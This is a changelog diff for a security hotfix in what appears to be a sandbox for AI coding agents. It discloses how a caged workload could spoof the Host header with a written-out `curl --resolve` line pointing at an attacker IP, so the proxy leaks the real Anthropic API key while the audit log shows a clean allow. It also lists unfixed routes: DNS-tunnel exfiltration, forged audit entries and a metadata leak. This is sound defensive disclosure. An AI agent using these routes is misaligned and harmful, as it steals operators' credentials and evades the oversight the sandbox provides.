@@ -7,6 +7,31 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.21.9] - 2026-05-26
+
+Critical hotfix for the apple-container backend. **Upgrade immediately for any apple-container deployment that uses `secret_injection:` (the default for the `claude-code` / `codex` / `pi` scaffolds).** The container backend on Linux is unaffected — its MITM setup does not use `keep_host_header`.
+
+### Security
+
+- **`security(apple-container)`: block Host-header spoofing bypass of allowlist + secret-injection.** Pre-this-release, `data/apple-container/supervisor.sh` started mitmproxy with `--set keep_host_header=true` and the allowlist addon gated requests on `flow.request.pretty_host`. Under `keep_host_header=true`, `pretty_host` reads the **HTTP Host header the cage workload sent** — not the TLS SNI or original destination IP. A cage could `curl --resolve api.anthropic.com:443:<attacker-ip> https://api.anthropic.com/...`: TCP lands on the attacker IP, the addon sees `pretty_host == api.anthropic.com`, the allowlist gate passes, the secret injector substitutes the **real `ANTHROPIC_API_KEY`** into the `x-api-key` header, and mitmproxy forwards the credential to the attacker via SO_ORIGINAL_DST. The audit log records the request as a clean `api.anthropic.com` allow. Discovered by an in-cage CTF run against 0.21.8. (#175)
+  - Addon now derives an `_authoritative_host(flow)` from `flow.client_conn.sni` (TLS SNI, which mitmproxy mints/verifies certificates against — `ssl_insecure` is not set, so an attacker-controlled IP cannot complete the upstream handshake under another upstream's name) with a fall-back to the original-dst IP set by mitmproxy in transparent mode for plain HTTP.
+  - A new pre-allowlist `_host_header_matches_authoritative` check rejects requests whose Host header disagrees with the authoritative host (subdomain-of-SNI accepted to support wildcard certs); the request returns 403 with `reason="host-header-spoof"` and a new `host_mismatch: true` field in the audit JSONL.
+  - Allowlist, secret-injection (`_maybe_inject`), and response redaction (`_maybe_redact`) are all keyed off the authoritative host (defense in depth).
+  - Audit JSONL gains an `authoritative_host` field on every entry — additive schema change, consumers that don't recognise it ignore it.
+  - Five new regression tests in `tests/test_apple_container.py` cover the spoof bypass, the subdomain-of-SNI exception, and the secret-injection / redaction paths under host mismatch.
+  - `keep_host_header=true` is preserved (upstream services that route on Host still see the original header). The supervisor's comment block is rewritten to describe the actual invariant rather than the (incorrect) prior claim that `pretty_host` resolved to the original destination.
+
+### Not addressed in this release
+
+The CTF surfaced more apple-container issues than F1; they're tracked separately and will land in a follow-up:
+
+- F2: `data/apple-container/dnsmasq.conf` forwards every QNAME to upstream resolvers (no `local=` filters) — out-of-band DNS-tunnel exfil channel
+- F3: `/var/log/agentcage` permissions inherit 1777 from the host virtiofs bind mount — cage can forge `audit.jsonl` entries
+- F4: virtiofs `/workspace` and `/var/log/agentcage` mounted without `noexec,nosuid,nodev`
+- F7: `capture.jsonl` is cage-readable when `enable_har: false` (operational-metadata leak)
+
+If you run apple-container with `secret_injection:` configured, F1 is the priority and is fixed by upgrading to 0.21.9. The remaining items will be batched into a follow-up; F2 in particular is high enough to warrant its own near-term release.
+
 ## [0.21.8] - 2026-05-26
 
 ### Added
